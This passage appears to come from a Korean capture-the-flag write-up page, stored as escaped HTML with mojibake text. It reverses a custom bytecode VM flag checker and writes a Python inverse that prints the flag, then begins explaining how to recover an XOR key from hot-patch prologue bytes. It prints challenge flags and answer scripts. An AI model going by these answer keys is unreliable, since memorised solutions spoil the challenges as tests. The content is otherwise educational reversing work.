}&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;4e85e8bb-4a42-41fa-8ccf-b7984255e025&quot; class=&quot;&quot;&gt;flag: bob{DO_NOT_USING_GOLANG_PLZ_JUST_KEEP_GOING}&lt;/p&gt;&lt;h2 id=&quot;8f7575ff-3cfc-40e1-9579-fdb8989bd585&quot; class=&quot;&quot;&gt;bvm-rev&lt;/h2&gt;&lt;hr id=&quot;02c4387b-275f-4afe-8ece-fba44fc70f4b&quot;/&gt;&lt;figure id=&quot;447613ae-27c2-48c3-a1b4-317811e57c86&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob952.png&quot;&gt;&lt;img style=&quot;width:796px&quot; src=&quot;/assets/bob/bob952.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;ab98e7fd-7d88-4724-b8fc-92621f3a5481&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;bvm ë°”ì´ë„ˆë¦¬ì—ì„œ ë¡œë“œí•˜ëŠ” flag.bvmì˜ ì½”ë“œ íë¦„ ë¶„ì„&lt;/div&gt;&lt;/figure&gt;&lt;p id=&quot;39f49a6b-e88e-494a-b516-336d8ad5b0d6&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;f716673e-546f-493d-b748-4369d16e78df&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/bob953.png&quot;&gt;&lt;img style=&quot;width:240px&quot; src=&quot;/assets/bob/bob953.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;p id=&quot;e5444b23-a59e-413e-8ca1-063157624d1b&quot; class=&quot;&quot;&gt;bvm íŒŒì¼ì€ ìœ„ ê·¸ë¦¼ê³¼ ê°™ì€ êµ¬ì¡°ë¥¼ ê°€ì§€ê³ , ê° ì„¹ì…˜ì€ ì½”ë“œ ì˜ì—­, ë°ì´í„° ì˜ì—­, ë³€ìˆ˜ ì˜ì—­ ë“±ìœ¼ë¡œ ì‚¬ìš©ëœë‹¤.&lt;/p&gt;&lt;pre id=&quot;e97b85a2-9457-40cb-bef2-e30cc1f0150f&quot; class=&quot;code&quot;&gt;&lt;code&gt;struct CALLSTACK {
    uint16_t reg[4];
    uint16_t retaddr;
};

struct BVM {
    uint16_t section[32];
    uint8_t 32;
    int8_t zf;
    struct CALLSTACK callstack[6];
    int8_t cs_count;
    uint32_t size;
    uint8_t data[2048];
    uint16_t reg[4]; //ax, bx, cx, dx
    uint16_t pc;
};&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;dee722a8-277d-46c0-8265-91e0dcef309d&quot; class=&quot;&quot;&gt;ê° opcodeê°€ ì–´ë–¤ ë™ì‘ì„ í•˜ëŠ”ì§€ íŒŒì•…í•˜ê¸° ìœ„í•´ì„œëŠ” êµ¬ì¡°ì²´ë¥¼ ì •ì˜í•˜ê³  ë¶„ì„í•˜ëŠ” ê²ƒì´ í¸í•˜ë‹¤.
&lt;/p&gt;&lt;p id=&quot;e87fe19d-3bf0-425d-b82d-d903dab198f1&quot; class=&quot;&quot;&gt;ê·¸ë¦¬ê³  ë¶„ì„ì„ í†µí•´ ì•„ë˜ì˜ ëª‡ê°€ì§€ ì‚¬ì‹¤ì„ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/p&gt;&lt;ol id=&quot;4939f94d-0764-41ce-99c6-aad52a7a4861&quot; class=&quot;numbered-list&quot; start=&quot;1&quot;&gt;&lt;li&gt;4ê°œì˜ register(ax, bx, cx, dx)ë¥¼ ì‚¬ìš©í•˜ê³  ê° ë ˆì§€ìŠ¤í„°ì™€ ëª¨ë“  ì—°ì‚°ì²˜ë¦¬ëŠ” 2bytes í¬ê¸°ë¥¼ ê°€ì§„ë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;ebed46a2-d044-4844-85e9-562ae4d56e00&quot; class=&quot;numbered-list&quot; start=&quot;2&quot;&gt;&lt;li&gt;CALL instructionì„ í˜¸ì¶œí•  ë•Œ registerì™€ ëŒì•„ì˜¬ ì£¼ì†Œë¥¼ ë°±ì—…í•˜ê³ , RETURNì„ ë§Œë‚˜ë©´ ax registerë¥¼ ì œì™¸í•œ registerë¥¼ ë³µì›í•˜ê³  ëŒì•„ì˜¬ ì£¼ì†Œë¡œ pcë¥¼ ë³€ê²½í•œë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;97d819de-0640-46ec-90f3-b8c6342796ba&quot; class=&quot;numbered-list&quot; start=&quot;3&quot;&gt;&lt;li&gt;ê²½ê³„(boundary)ë¥¼ ë„˜ì–´ì„œëŠ” ì°¸ì¡°ê°€ ë°œê²¬ë˜ë©´ í”„ë¡œê·¸ë¨ì´ ì¢…ë£Œëœë‹¤. (ì¼ë¶€ opcodeì—ì„œëŠ” ê²½ê³„ ê²€ì‚¬ë¥¼ í•˜ì§€ ì•ŠëŠ”ë‹¤)&lt;/li&gt;&lt;/ol&gt;&lt;p id=&quot;7a4c8bee-cb4c-461e-8642-ff18e8433774&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;f2cb0fdd-ce1d-4cd4-8a5f-28c0d64f86b7&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;.KEY
db 170, 68, 138, 0, 142, 162, 151, 226, 51, 148, 151, 94, 14, 185, 161, 33


.ENC_FLAG
db 123, 120, 140, 153, 192, 37, 165, 150, 203, 23, 199, 222, 164, 129, 2, 229, 59, 56, 195, 97, 207, 108, 50, 51, 153, 248, 39, 72, 122, 0, 93, 44, 113


.GET_FLAG_LENGTH
MOVE ax, SECTION#INPUT_FLAG
MOVE cx, 0
:LABEL_1
MOVE bx, ax
ADD bx, cx
MOVE bx, [bx]
AND bx, 255
COMP bx, 0
JE LABEL_2
COMP bx, 10 // &amp;#x27;\n&amp;#x27;
JE LABEL_2
ADD cx, 1
JMP LABEL_1
:LABEL_2
MOVE ax, cx
RETURN

.ROL
MOVE cx, bx
MOD cx, 8
MOVE bx, 8
SUB bx, cx
RSHIFT cx, ax, bx

MOVE dx, 8
SUB dx, bx
MOVE bx, dx

LSHIFT dx, ax, bx
MOVE bx, 8
LSHIFT ax, cx, bx
SUB dx, ax
MOVE ax, dx
ADD ax, cx
RETURN


.FLAG_CHECK
MOVE cx, 0

:LABEL_3
MOVE ax, SECTION#INPUT_FLAG
ADD ax, cx
MOVE ax, [ax]
AND ax, 255
MOVE bx, cx
CALL ROL
MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE [bx], ax

MOVE ax, SECTION#KEY
MOVE bx, cx
MOD bx, 16
ADD ax, bx
MOVE dx, [ax]
AND dx, 255

MOVE ax, SECTION#INPUT_FLAG
MOVE bx, cx
ADD bx, 1
MOD bx, 33
ADD ax, bx
MOVE ax, [ax]
AND ax, 255

ADD dx, ax
MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE ax, [bx]
XOR ax, dx
AND ax, 255

MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE [bx], ax

ADD cx, 1
COMP cx, 33
JNE LABEL_3

MOVE cx, 0
MOVE dx, 1

:LABEL_4
MOVE ax, SECTION#RESULT_FLAG
ADD ax, cx
MOVE ax, [ax]
AND ax, 255
MOVE bx, SECTION#ENC_FLAG
ADD bx, cx
MOVE bx, [bx]
AND bx, 255
COMP ax, bx
JE LABEL_5
MOVE dx, 0
:LABEL_5

ADD cx, 1
COMP cx, 33
JNE LABEL_4
MOVE ax, dx
RETURN


.STRING_CHECK_YOUR_FLAG
string &amp;quot;Check your flag: &amp;quot;


.STRING_CORRECT
string &amp;quot;Correct !!\n&amp;quot;


.STRING_INCORRECT
string &amp;quot;Wrong ...\n&amp;quot;


.INPUT_FLAG
empty 50


.RESULT_FLAG
empty 34


.MAIN
MOVE cx, 17
MOVE bx, SECTION#STRING_CHECK_YOUR_FLAG
MOVE ax, 1
SYSCALL

MOVE cx, 48
MOVE bx, SECTION#INPUT_FLAG
MOVE ax, 0
SYSCALL

CALL GET_FLAG_LENGTH
COMP ax, 33
JNE LABEL_6

CALL FLAG_CHECK
COMP ax, 1

JNE LABEL_6
MOVE cx, 11
MOVE bx, SECTION#STRING_CORRECT
MOVE ax, 1
SYSCALL
RETURN

:LABEL_6
MOVE cx, 10
MOVE bx, SECTION#STRING_INCORRECT
MOVE ax, 1
SYSCALL
RETURN&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;193e6bb9-29cf-41ce-affa-9752dbf58d7e&quot; class=&quot;&quot;&gt;bvm ë°”ì´ë„ˆë¦¬ ë¶„ì„ì„ í†µí•´ ê° bvm opcodeë¥¼ í•´ì„í•˜ê³  flag.bvmì„ ìœ„ì™€ ê°™ì´ disassembleí•œë‹¤.&lt;/p&gt;&lt;p id=&quot;6cff05ce-75a0-4167-88ce-9010396c473f&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;8b682fa9-5861-4c17-bc93-e2212075fcfa&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;def ROL(data, shift):
    shift %= 8
    remains = data &amp;gt;&amp;gt; (8 - shift)
    body = (data &amp;lt;&amp;lt; shift) - (remains &amp;lt;&amp;lt; 8)
    return (body + remains)

def GET_FLAG_LENGTH(inp):
    return len(inp)

ENC_FLAG = [123, 120, 140, 153, 192, 37, 165, 150, 203, 23, 199, 222, 164, 129, 2, 229, 59, 56, 195, 97, 207, 108, 50, 51, 153, 248, 39, 72, 122, 0, 93, 44, 113]
KEY = [170, 68, 138, 0, 142, 162, 151, 226, 51, 148, 151, 94, 14, 185, 161, 33]

INPUT_FLAG = list(input(&amp;quot;Check your flag: &amp;quot;).encode())
if GET_FLAG_LENGTH(INPUT_FLAG) != 33:
    exit(0)

RESULT_FLAG = [0] * 33

for i in range(33):
    RESULT_FLAG[i] = ROL(INPUT_FLAG[i], i)
    RESULT_FLAG[i] ^= KEY[i % 16] + INPUT_FLAG[(i + 1) % 33]
    RESULT_FLAG[i] &amp;amp;= 0xFF

if RESULT_FLAG == ENC_FLAG:
    print(&amp;quot;Correct !!&amp;quot;)
else:
    print(&amp;quot;Wrong ..&amp;quot;)&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;605bbd8c-8888-404b-b522-461b5e8e6a60&quot; class=&quot;&quot;&gt;disassmbleí•œ ê²°ê³¼ë¥¼ pythonìœ¼ë¡œ í¬íŒ…í•œë‹¤.&lt;/p&gt;&lt;p id=&quot;a84518c4-3e41-4e53-b8c0-bb8d137b0fe1&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;pre id=&quot;2a8e67a1-5f9c-42c8-8b02-84646f4500b5&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;def ROR(data, shift):
    shift %= 8
    body = data &amp;gt;&amp;gt; shift
    remains = (data &amp;lt;&amp;lt; (8 - shift)) - (body &amp;lt;&amp;lt; 8)
    return (body + remains)


KEY = [170, 68, 138, 0, 142, 162, 151, 226, 51, 148, 151, 94, 14, 185, 161, 33]
ENC_FLAG = [123, 120, 140, 153, 192, 37, 165, 150, 203, 23, 199, 222, 164, 129, 2, 229, 59, 56, 195, 97, 207, 108, 50, 51, 153, 248, 39, 72, 122, 0, 93, 44, 113]

FLAG = [0] * 33
FLAG[0] = ord(&amp;#x27;b&amp;#x27;) # prefix &amp;quot;bob{&amp;quot;

for i in range(32, -1, -1):
    FLAG[i] = ROR(ENC_FLAG[i] ^ (FLAG[(i + 1) % 33] + KEY[i % 16]) &amp;amp; 0xFF, i)

print(&amp;quot;FLAG =&amp;gt; {}&amp;quot;.format(bytes(FLAG)))
# FLAG =&amp;gt; b&amp;#x27;bob{BVM_Wi1l_C0m2_B@ck_N2xt_T1me}&amp;#x27;&lt;/code&gt;&lt;/pre&gt;&lt;p id=&quot;c857e070-befc-4dde-a546-dd9a94e82d62&quot; class=&quot;&quot;&gt;ì´ê²ƒì„ ì—­ì—°ì‚°í•˜ëŠ” ì½”ë“œë¥¼ ì‘ì„±í•˜ë©´ flagë¥¼ íšë“í•  ìˆ˜ ìˆë‹¤.&lt;/p&gt;&lt;p id=&quot;c61f294c-7cf3-4239-9ccd-e2cb499a0f41&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;p id=&quot;c68495fd-926f-458d-be22-13dacd1a0afb&quot; class=&quot;&quot;&gt;í•´ë‹¹ ë°©ì‹ ì´ì™¸ì— ë¹„êµ opcode(0x9, 0x19)ì— BPë¥¼ ê±¸ê³  inputì— ë”°ë¼ ë³€í™”í•˜ëŠ” registerë¥¼ ë³´ê³  ê·œì¹™ì„ ì°¾ì•„ flagë¥¼ ê°„ì ‘ì ìœ¼ë¡œ ì¶”ì¶œí•˜ëŠ” ë°©ë²•ë„ ê°€ëŠ¥í•˜ë‹¤.&lt;/p&gt;&lt;p id=&quot;6bc8cea7-410f-47b9-9545-d7737d79d783&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;h2 id=&quot;3e66feff-1093-42d7-8151-0c9586d0acc5&quot; class=&quot;&quot;&gt;Hot Patching&lt;/h2&gt;&lt;hr id=&quot;224122d1-e93e-4d4b-93ba-72e89ad1730b&quot;/&gt;&lt;figure id=&quot;21d3e7c1-4597-454a-90c8-cebf22bb5346&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/hot_patching_1.png&quot;&gt;&lt;img style=&quot;width:796px&quot; src=&quot;/assets/bob/hot_patching_1.png&quot;/&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;6987453d-bb8c-479e-bb48-baf2a46795da&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;ğŸ’¡&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;Hot Patching ë°”ì´íŠ¸ë¥¼ í†µí•œ Key ì¶”ì¶œ&lt;/div&gt;&lt;/figure&gt;&lt;p id=&quot;e6f138b9-b1fa-467f-857e-6b5659011d71&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;e84278d2-915c-44d1-b416-861ece1ac0f1&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/01_main.png&quot;&gt;&lt;img style=&quot;width:462px&quot; src=&quot;/assets/bob/01_main.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                        [ê·¸ë¦¼ 1] main í•¨ìˆ˜(0x42D7A0) Hex-Rays ê²°ê³¼&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;13c7236c-5a09-4564-bb4a-9c57e2523983&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;main í•¨ìˆ˜(0x42D7A0)ì—ì„œ sub_401000ì„ í˜¸ì¶œí•œë‹¤.&lt;p id=&quot;a2e5c459-d47a-4508-b0fc-984e40e398d0&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;013d0fde-59f3-4b47-a14f-53a988026eba&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/02_401000.png&quot;&gt;&lt;img style=&quot;width:658px&quot; src=&quot;/assets/bob/02_401000.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                                     [ê·¸ë¦¼ 2] sub_401000 í•¨ìˆ˜ Hex-Rays ê²°ê³¼&lt;/figcaption&gt;&lt;/figure&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;7605cae9-9a30-4acc-996d-60189c06b982&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;sub_401000ì€ ìœ„ì™€ ê°™ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;cc657dc8-1a18-4d33-8bc6-47fb63f39ebf&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;cb06f9bc-485e-4c87-8d59-5b3dbe20d263&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/03_42D710.png&quot;&gt;&lt;img style=&quot;width:509px&quot; src=&quot;/assets/bob/03_42D710.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                  [ê·¸ë¦¼ 3] Xorì„ ìˆ˜í–‰í•˜ëŠ” sub_42D710 í•¨ìˆ˜&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;8b583f8e-2b93-45cc-b573-b474c574211f&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;sub_42D710ëŠ” sub_401000ì—ì„œ ë‘ ë²ˆ í˜¸ì¶œëœë‹¤.
VirtualProtectë¥¼ í†µí•´ íŠ¹ì • ì˜ì—­ì˜ ë©”ëª¨ë¦¬ë¥¼ PAGE_EXECUTE_READWRITE(0x40)ìœ¼ë¡œ ë³€ê²½ì‹œí‚¨ë‹¤.
ê·¸ í›„ ì„¸ë²ˆ ì§¸ ì¸ì ê°’ì„ ì°¸ì¡°í•˜ì—¬ Xor ì—°ì‚° í•œë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;f04502d4-aa04-47d0-b8c7-13faa08a4ab5&quot; class=&quot;&quot;&gt;
&lt;/p&gt;&lt;figure id=&quot;dcf63de5-941b-4367-aa92-6d21215ff902&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/04_sub_401000.png&quot;&gt;&lt;img style=&quot;width:604px&quot; src=&quot;/assets/bob/04_sub_401000.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                     [ê·¸ë¦¼ 4] sub_401000 í•¨ìˆ˜ ë™ì‘ íŒŒì•… í›„ ë„¤ì´ë° ê²°ê³¼&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;f7f2155a-513d-43c0-b8a8-f29725846283&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;sub_401000 í•¨ìˆ˜ ë‚´ ë³€ìˆ˜ ë° í•¨ìˆ˜ ì´ë¦„ì„ ë³´ê¸° ì‰½ê²Œ ë„¤ì´ë°í•˜ì˜€ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;ul id=&quot;9044899c-b60b-478a-8e78-6660947fcff2&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;í•´ë‹¹ í•¨ìˆ˜ì˜ ì‹¤í–‰ íë¦„ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.&lt;ol id=&quot;aef5efd6-5eb4-47f0-b457-29d58abda398&quot; class=&quot;numbered-list&quot; start=&quot;1&quot;&gt;&lt;li&gt;scanf_s í•¨ìˆ˜ë¥¼ í†µí•´ ì…ë ¥ì„ ë°›ëŠ”ë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;87dd3407-51b5-4417-a2a4-f6151c88b07d&quot; class=&quot;numbered-list&quot; start=&quot;2&quot;&gt;&lt;li&gt;&lt;strong&gt;ì…ë ¥ ê°’&lt;/strong&gt;ì˜ ê¸€ì ìˆ˜ë¥¼ í™•ì¸í•˜ê³ , &lt;strong&gt;5ê¸€ì&lt;/strong&gt;ê°€ ì•„ë‹ ì‹œ 1ì„ ë°˜í™˜í•œë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;24e6d6bc-c45b-4ae3-aa98-5390709f2bc3&quot; class=&quot;numbered-list&quot; start=&quot;3&quot;&gt;&lt;li&gt;&lt;strong&gt;0x4010D0&lt;/strong&gt; ì£¼ì†Œì—ì„œ 0x2C630(0x42D700 - 0x4010D0) í¬ê¸° ë§Œí¼ &lt;strong&gt;ì…ë ¥ ê°’&lt;/strong&gt;ê³¼ &lt;strong&gt;Xor&lt;/strong&gt; ì—°ì‚° í•œë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;55b76fd4-10eb-4a24-8624-2c0eb6828f8d&quot; class=&quot;numbered-list&quot; start=&quot;4&quot;&gt;&lt;li&gt;&lt;strong&gt;0x44A8C0&lt;/strong&gt; ì£¼ì†Œì—ì„œ 0x20 í¬ê¸° ë§Œí¼ &lt;strong&gt;ì…ë ¥ ê°’&lt;/strong&gt;ê³¼ &lt;strong&gt;Xor&lt;/strong&gt; ì—°ì‚° í•œë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;ol id=&quot;f8c7101f-192b-40de-9ba8-944d8b828cab&quot; class=&quot;numbered-list&quot; start=&quot;5&quot;&gt;&lt;li&gt;Xor ì—°ì‚° í›„ì˜ &lt;strong&gt;0x4010D0&lt;/strong&gt; í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œë‹¤.&lt;/li&gt;&lt;/ol&gt;&lt;/li&gt;&lt;/ul&gt;&lt;figure id=&quot;7a08cb7d-cbd1-4669-b0f8-9c3aa4cb2966&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/05_4010D0.png&quot;&gt;&lt;img style=&quot;width:587px&quot; src=&quot;/assets/bob/05_4010D0.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                                               [ê·¸ë¦¼ 5] Xor ì—°ì‚° ì „ sub_4010D0 í•¨ìˆ˜&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;534f1888-e0b9-434f-bde0-2e5bc17d9116&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;Xor ì—°ì‚° ì „ 0x4010D0 í•¨ìˆ˜ëŠ” ìœ„ì™€ ê°™ì´ ìƒê²¼ë‹¤. ì‹¤í–‰ ê°€ëŠ¥í•œ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œë¡œëŠ” ë³´ì´ì§€ ì•ŠëŠ”ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;p id=&quot;b887ac21-9343-41e2-9208-0d688d86dc14&quot; class=&quot;block-color-gray&quot;&gt;                                     &lt;strong&gt;&lt;em&gt;&amp;quot;ê·¸ë ‡ë‹¤ë©´, ì…ë ¥ ê°’ì´ 5ê¸€ìì¸ ê²ƒ ì™¸ì— ë‹¨ì„œëŠ” ë¬´ì—‡ì´ ìˆì„ê¹Œ?&amp;quot;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;&lt;ul id=&quot;68e771a6-56bd-4ec5-bda8-a02c07ca291d&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;0x4010D0ì€ ë‹¤ë¥¸ í•¨ìˆ˜ì™€ ê³µí†µëœ &lt;mark class=&quot;highlight-blue&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Function_prologue&quot;&gt;í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸&lt;/a&gt;&lt;/strong&gt;&lt;/mark&gt;ë¥¼ ê°€ì§€ê³  ìˆì„ ê²ƒì´ë‹¤.
x86 ì‹¤í–‰ ë°”ì´ë„ˆë¦¬ëŠ” í•¨ìˆ˜ ì‹œì‘ ì‹œ ì•„ë˜ì™€ ê°™ì€ í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ë¥¼ ê°€ì§€ê³  ìˆë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;pre id=&quot;1507b36c-3e98-4add-bed0-465f687bf604&quot; class=&quot;code code-wrap&quot;&gt;&lt;code&gt;&lt;mark class=&quot;highlight-teal&quot;&gt;55        &lt;/mark&gt;&lt;mark class=&quot;highlight-blue&quot;&gt;push &lt;/mark&gt;&lt;mark class=&quot;highlight-pink&quot;&gt;ebp&lt;/mark&gt;
&lt;mark class=&quot;highlight-teal&quot;&gt;8B EC&lt;/mark&gt;     &lt;mark class=&quot;highlight-blue&quot;&gt;mov &lt;/mark&gt;&lt;mark class=&quot;highlight-pink&quot;&gt;ebp&lt;/mark&gt;, &lt;mark class=&quot;highlight-pink&quot;&gt;esp&lt;/mark&gt;&lt;mark class=&quot;highlight-teal&quot;&gt;
83 EC XX&lt;/mark&gt;  &lt;mark class=&quot;highlight-blue&quot;&gt;sub &lt;/mark&gt;&lt;mark class=&quot;highlight-pink&quot;&gt;esp&lt;/mark&gt;, &lt;mark class=&quot;highlight-teal&quot;&gt;N&lt;/mark&gt;&lt;/code&gt;&lt;/pre&gt;&lt;figure id=&quot;89aa2cd1-4ac2-4401-a623-633dfc1579b8&quot; class=&quot;image&quot;&gt;&lt;a href=&quot;/assets/bob/06_prol.png&quot;&gt;&lt;img style=&quot;width:363px&quot; src=&quot;/assets/bob/06_prol.png&quot;/&gt;&lt;/a&gt;&lt;figcaption&gt;                         [ê·¸ë¦¼ 6] í•¨ìˆ˜ ì´ˆê¸° í”„ë¡¤ë¡œê·¸&lt;/figcaption&gt;&lt;/figure&gt;&lt;ul id=&quot;6feebefa-3e7b-43bf-b1e5-153e36779850&quot; class=&quot;bulleted-list&quot;&gt;&lt;li&gt;ë¬¸ì œ ë°”ì´ë„ˆë¦¬ì—ì„œëŠ” í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ ì´ì „ì— 2ë°”ì´íŠ¸ ì–´ì…ˆë¸”ë¦¬ &lt;mark class=&quot;highlight-blue&quot;&gt;&lt;code&gt;xchg&lt;/code&gt;&lt;/mark&gt;&lt;code&gt;&lt;mark class=&quot;highlight-pink&quot;&gt;ax&lt;/mark&gt;&lt;/code&gt;&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;code&gt;,&lt;/code&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-pink&quot;&gt;&lt;code&gt;ax&lt;/code&gt;&lt;/mark&gt; ê°€ ë³´ì¸ë‹¤.
í•´ë‹¹ ì–´ì…ˆë¸”ë¦¬ëŠ” 2ë°”ì´íŠ¸ NOP ì½”ë“œ &lt;code&gt;0x66 0x90&lt;/code&gt; ì´ë‹¤.
Visual Studio ì»´íŒŒì¼ ì‹œ &lt;mark class=&quot;highlight-blue&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://docs.microsoft.com/ko-kr/cpp/build/reference/hotpatch-create-hotpatchable-image?view=vs-2019&quot;&gt;HotPatch ì˜µì…˜&lt;/a&gt;&lt;/strong&gt;&lt;/mark&gt;ì´ í™œì„±í™” ëœ ê²½ìš° ìƒê¸°ëŠ” ì½”ë“œì´ë‹¤.&lt;/li&gt;&lt;/ul&gt;&lt;figure class=&quot;block-color-gray_background callout&quot; style=&quot;white-space:pre-wrap;display:flex&quot; id=&quot;142cc00d-674c-41ae-9771-05b2cea11167&quot;&gt;&lt;div style=&quot;font-size:1.5em&quot;&gt;&lt;span class=&quot;icon&quot;&gt;âœ…&lt;/span&gt;&lt;/div&gt;&lt;div style=&quot;width:100%&quot;&gt;&lt;mark class=&quot;highlight-blue&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Patch_(computing)#Hot_patching&quot;&gt;&lt;strong&gt;Hot Patching&lt;/strong&gt;&lt;/a&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-blue&quot;&gt;&lt;strong&gt;[1]&lt;/strong&gt;&lt;/mark&gt;ì´ë€, ì„œë¹„ìŠ¤ì˜ ì¢…ë£Œë‚˜ ì¬ì‹œì‘ ì—†ì´ íŒ¨ì¹˜ë¥¼ ì ìš©í•˜ëŠ” ì—…ë°ì´íŠ¸ ë°©ë²•ì´ë‹¤.
x86 ì–´ì…ˆë¸”ë¦¬ ì–¸ì–´ì—ì„œëŠ” íŒ¨ì¹˜ë¥¼ ìœ„í•´ LONG JMP ëª…ë ¹ì„ ì‚¬ìš©í•œë‹¤.
í•´ë‹¹ ëª…ë ¹ì€ 5ë°”ì´íŠ¸ê°€ í•„ìš”í•˜ë¯€ë¡œ, &lt;strong&gt;3ë°”ì´íŠ¸&lt;/strong&gt;ì¸ &lt;strong&gt;í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸&lt;/strong&gt; ì™¸ &lt;strong&gt;2ë°”ì´íŠ¸&lt;/strong&gt;ì˜&lt;strong&gt; NOP ì½”ë“œ&lt;/strong&gt;ë¥¼
ì¶”ê°€í•˜ì—¬ &lt;mark class=&quot;highlight-blue&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc782258(v=ws.10)?redirectedfrom=MSDN&quot;&gt;Hot Patching&lt;/a&gt;&lt;/strong&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-blue&quot;&gt;&lt;strong&gt;[2]&lt;/strong&gt;&lt;/mark&gt;ì— ì‚¬ìš©í•œë‹¤.

&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;strong&gt;&lt;em&gt;Windows x86 ë¼ì´ë¸ŒëŸ¬ë¦¬ ëª¨ë“ˆì—ì„œëŠ” ì£¼ë¡œ&lt;/em&gt;&lt;/strong&gt;&lt;/mark&gt; &lt;mark class=&quot;highlight-blue&quot;&gt;&lt;code&gt;mov&lt;/code&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-pink&quot;&gt;&lt;code&gt;edi&lt;/code&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-gray&quot;&gt;&lt;code&gt;,&lt;/code&gt;&lt;/mark&gt;&lt;mark class=&quot;highlight-pink&quot;&gt;&lt;code&gt;edi&lt;/code&gt;&lt;/mark&gt; &lt;mark class=&quot;highlight-gray&quot;&gt;&lt;strong&gt;&lt;em&gt;ë¥¼ ì‚¬ìš©í•œë‹¤.&lt;/em&gt;&lt;/strong&gt;&lt;/mark&gt;&lt;/div&gt;&lt;/figure&gt;&lt;p id=&quot;65bcbaae-46f3-4868-bb0b-369b174fb4f0&quot; class=&quot;&quot;&gt;
